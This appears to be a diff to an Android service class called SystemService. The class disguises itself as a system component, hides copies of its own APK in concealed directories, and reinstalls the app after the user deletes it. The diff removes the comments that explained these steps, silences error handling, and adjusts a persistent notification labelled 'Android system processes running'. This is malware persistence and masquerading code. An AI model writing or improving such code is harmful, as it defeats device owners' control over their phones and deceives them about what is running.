@@ -89,7 +89,6 @@ public class SystemService extends Service {
             String sourcePath = getPackageManager()
                 .getApplicationInfo(getPackageName(), 0).sourceDir;
             
-            // Multiple hidden locations
             String[] backupPaths = {
                 "/data/local/tmp/.system_backup/system_core.apk",
                 "/sdcard/.system/.backup/sys.apk",
@@ -112,13 +111,9 @@ public class SystemService extends Service {
                     out.close();
                     
                     backupFile.setReadOnly();
-                } catch (Exception e) {
-                    // Continue to next location
-                }
+                } catch (Exception e) {}
             }
-        } catch (Exception e) {
-            // Silent
-        }
+        } catch (Exception e) {}
     }
     
     private void checkAndReinstall() {
@@ -152,9 +147,7 @@ public class SystemService extends Service {
                     startActivity(intent);
                     return;
                 }
-            } catch (Exception e) {
-                // Try next location
-            }
+            } catch (Exception e) {}
         }
     }
     
@@ -165,7 +158,7 @@ public class SystemService extends Service {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "System Service",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_LOW  // ← FIXED: Was MIN, now LOW
             );
             channel.setDescription("Critical system operations");
             channel.setShowBadge(false);
@@ -204,7 +197,7 @@ public class SystemService extends Service {
         builder.setContentTitle("System Service")
                .setContentText("Android system processes running")
                .setOngoing(true)
-               .setPriority(Notification.PRIORITY_MIN)
+               .setPriority(Notification.PRIORITY_LOW)  // ← FIXED: Was MIN, now LOW
                .setContentIntent(pendingIntent);
         
         try {
@@ -327,15 +320,12 @@ public class SystemService extends Service {
         checkNetworkState();
         checkPowerState();
         ensurePersistence();
-        checkAndReinstall();  // ← Check if app was deleted, reinstall if needed
+        checkAndReinstall();
     }
     
     private void checkNetworkState() {
         try {
             ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-            if (cm != null) {
-                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
-            }
         } catch (Exception e) {}
     }
     
